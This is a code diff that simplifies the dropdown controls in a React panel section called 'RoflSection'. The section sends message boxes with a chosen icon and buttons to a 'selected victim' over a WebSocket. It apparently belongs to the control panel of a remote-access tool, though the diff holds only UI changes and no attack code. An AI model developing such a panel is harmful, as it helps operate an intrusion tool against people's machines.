@@ -1,28 +1,11 @@
 "use client";
 
-import { useEffect, useState } from "react";
+import { useEffect } from "react";
 import { useQueryClient } from "@tanstack/react-query";
 
 import { usePanelDetailView } from "../panel-detail-view-provider";
 import { usePanelWS } from "../../../ws/ws-provider";
 import { bindRoflActions } from "./rofl/bind-rofl-actions";
-
-const ICON_OPTIONS = [
-    { value: "info", label: "Info" },
-    { value: "error", label: "Error" },
-    { value: "warning", label: "Warning" },
-    { value: "question", label: "Question" },
-    { value: "none", label: "None" },
-];
-
-const BUTTONS_OPTIONS = [
-    { value: "ok", label: "OK" },
-    { value: "okcancel", label: "OK / Cancel" },
-    { value: "yesno", label: "Yes / No" },
-    { value: "yesnocancel", label: "Yes / No / Cancel" },
-    { value: "retrycancel", label: "Retry / Cancel" },
-    { value: "abortretryignore", label: "Abort / Retry / Ignore" },
-];
 
 const CARD =
     "rofl-card w-[420px] max-w-[calc(100vw-420px)] ml-[4px] rounded-[18px] border border-white/[0.14] " +
@@ -39,42 +22,14 @@ export function RoflSection() {
     const detail = usePanelDetailView();
     const ws = usePanelWS();
     const qc = useQueryClient();
-    const [iconValue, setIconValue] = useState("info");
-    const [buttonsValue, setButtonsValue] = useState("ok");
-    const [iconOpen, setIconOpen] = useState(false);
-    const [buttonsOpen, setButtonsOpen] = useState(false);
-
-    useEffect(() => {
-        const handleClickOutside = (e: MouseEvent) => {
-            const target = e.target as Node;
-            const iconBtn = document.querySelector('[data-icon-btn]');
-            const iconMenu = document.querySelector('[data-icon-menu]');
-            const buttonsBtn = document.querySelector('[data-buttons-btn]');
-            const buttonsMenu = document.querySelector('[data-buttons-menu]');
-
-            if (iconOpen && iconMenu && iconBtn && !iconMenu.contains(target) && !iconBtn.contains(target)) {
-                setIconOpen(false);
-            }
-            if (buttonsOpen && buttonsMenu && buttonsBtn && !buttonsMenu.contains(target) && !buttonsBtn.contains(target)) {
-                setButtonsOpen(false);
-            }
-        };
-
-        if (iconOpen || buttonsOpen) {
-            document.addEventListener("click", handleClickOutside);
-            return () => document.removeEventListener("click", handleClickOutside);
-        }
-    }, [iconOpen, buttonsOpen]);
 
     useEffect(() => {
         return bindRoflActions({
             selectedVictimId: detail.selectedVictimId,
             qc,
             ws,
-            getIconValue: () => iconValue,
-            getButtonsValue: () => buttonsValue,
         });
-    }, [detail.selectedVictimId, qc, ws, iconValue, buttonsValue]);
+    }, [detail.selectedVictimId, qc, ws]);
 
     return (
         <div className="detail-section h-[100dvh] overflow-y-auto pb-[60px]" data-section="rofl">
@@ -149,42 +104,13 @@ export function RoflSection() {
 
                     <div className="grid grid-cols-[90px_1fr] items-center gap-[10px] my-[8px]">
                         <div className="text-[14px] font-semibold text-[rgba(235,235,235,0.94)]">Icon:</div>
-                        <div className="relative w-full">
-                            <button
-                                type="button"
-                                data-icon-btn
-                                className="w-full flex h-[32px] items-center gap-[6px] rounded-[10px] border border-white/[0.12] bg-white/[0.04] px-[10px] text-[13px] font-semibold text-white/80 justify-between transition-all cursor-pointer hover:bg-white/[0.07] hover:border-white/[0.18] hover:text-white"
-                                onClick={() => setIconOpen(!iconOpen)}
-                            >
-                                <span>{ICON_OPTIONS.find((o) => o.value === iconValue)?.label || "Info"}</span>
-                                <span className="text-[10px] opacity-50">▼</span>
-                            </button>
-                            {iconOpen && (
-                                <div data-icon-menu className="absolute z-30 top-[36px] left-0 right-0 max-h-[240px] overflow-auto rounded-[14px] border border-white/[0.12] bg-[rgba(16,16,16,0.96)] p-[6px] text-white shadow-[0_14px_34px_rgba(0,0,0,0.55)]">
-                                    {ICON_OPTIONS.map((opt) => {
-                                        const selected = iconValue === opt.value;
-                                        return (
-                                            <button
-                                                key={opt.value}
-                                                type="button"
-                                                className={
-                                                    "w-full flex items-center justify-start px-[10px] py-[9px] rounded-[12px] text-[13px] leading-[1.15] font-semibold transition-[background,border-color] cursor-pointer border " +
-                                                    (selected
-                                                        ? "bg-white/[0.07] border-white/[0.16] text-white"
-                                                        : "bg-transparent border-transparent text-white/90 hover:bg-white/[0.045] hover:border-white/[0.10]")
-                                                }
-                                                onClick={() => {
-                                                    setIconValue(opt.value);
-                                                    setIconOpen(false);
-                                                }}
-                                            >
-                                                {opt.label}
-                                            </button>
-                                        );
-                                    })}
-                                </div>
-                            )}
-                        </div>
+                        <select id="roflMsgIcon" className="rofl-select w-full rounded-[10px] border border-white/[0.18] bg-[rgba(0,0,0,0.52)] px-[10px] py-[7px] text-[14px] text-white outline-none appearance-none">
+                            <option value="info">Info</option>
+                            <option value="error">Error</option>
+                            <option value="warning">Warning</option>
+                            <option value="question">Question</option>
+                            <option value="none">None</option>
+                        </select>
                     </div>
 
                     <div className="grid grid-cols-[90px_1fr] items-center gap-[10px] my-[8px]">
@@ -210,42 +136,14 @@ export function RoflSection() {
 
                     <div className="mt-[14px] grid grid-cols-[90px_minmax(140px,220px)_max-content] items-center gap-x-[12px] gap-y-[10px]">
                         <div className="text-[14px] font-semibold text-[rgba(235,235,235,0.94)]">Buttons:</div>
-                        <div className="relative w-full">
-                            <button
-                                type="button"
-                                data-buttons-btn
-                                className="w-full flex h-[32px] items-center gap-[6px] rounded-[10px] border border-white/[0.12] bg-white/[0.04] px-[10px] text-[13px] font-semibold text-white/80 justify-between transition-all cursor-pointer hover:bg-white/[0.07] hover:border-white/[0.18] hover:text-white"
-                                onClick={() => setButtonsOpen(!buttonsOpen)}
-                            >
-                                <span>{BUTTONS_OPTIONS.find((o) => o.value === buttonsValue)?.label || "OK"}</span>
-                                <span className="text-[10px] opacity-50">▼</span>
-                            </button>
-                            {buttonsOpen && (
-                                <div data-buttons-menu className="absolute z-30 top-[36px] left-0 right-0 max-h-[240px] overflow-auto rounded-[14px] border border-white/[0.12] bg-[rgba(16,16,16,0.96)] p-[6px] text-white shadow-[0_14px_34px_rgba(0,0,0,0.55)]">
-                                    {BUTTONS_OPTIONS.map((opt) => {
-                                        const selected = buttonsValue === opt.value;
-                                        return (
-                                            <button
-                                                key={opt.value}
-                                                type="button"
-                                                className={
-                                                    "w-full flex items-center justify-start px-[10px] py-[9px] rounded-[12px] text-[13px] leading-[1.15] font-semibold transition-[background,border-color] cursor-pointer border " +
-                                                    (selected
-                                                        ? "bg-white/[0.07] border-white/[0.16] text-white"
-                                                        : "bg-transparent border-transparent text-white/90 hover:bg-white/[0.045] hover:border-white/[0.10]")
-                                                }
-                                                onClick={() => {
-                                                    setButtonsValue(opt.value);
-                                                    setButtonsOpen(false);
-                                                }}
-                                            >
-                                                {opt.label}
-                                            </button>
-                                        );
-                                    })}
-                                </div>
-                            )}
-                        </div>
+                        <select id="roflMsgButtons" className="rofl-select w-full rounded-[10px] border border-white/[0.18] bg-[rgba(0,0,0,0.52)] px-[10px] py-[7px] text-[14px] text-white outline-none appearance-none">
+                            <option value="ok">OK</option>
+                            <option value="okcancel">OK / Cancel</option>
+                            <option value="yesno">Yes / No</option>
+                            <option value="yesnocancel">Yes / No / Cancel</option>
+                            <option value="retrycancel">Retry / Cancel</option>
+                            <option value="abortretryignore">Abort / Retry / Ignore</option>
+                        </select>
                         <button id="roflMsgSendBtn" className={BTN} style={{ borderBottom: "4px solid var(--line)" }}>
                             Send
                         </button>
